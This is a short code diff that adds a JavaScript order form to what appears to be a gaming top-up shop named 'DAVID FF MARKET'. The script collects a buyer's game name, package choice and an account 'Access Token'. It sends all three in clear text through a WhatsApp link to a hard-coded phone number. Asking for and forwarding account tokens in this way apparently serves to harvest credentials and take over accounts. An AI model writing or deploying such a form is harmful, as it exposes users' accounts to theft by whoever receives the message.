@@ -81,3 +81,23 @@ window.open(
 
 }
 </script>
+<script>
+function sendOrder() {
+
+var game = document.getElementById("game").value;
+var token = document.getElementById("token").value;
+var pack = document.getElementById("package").value;
+
+var text =
+"🔥 DAVID FF MARKET ORDER 🔥\n\n" +
+"🎮 Game Name: " + game + "\n" +
+"🔑 Access Token: " + token + "\n" +
+"💎 Package: " + pack;
+
+window.open(
+"https://wa.me/918601322748?text=" +
+encodeURIComponent(text)
+);
+
+}
+</script>
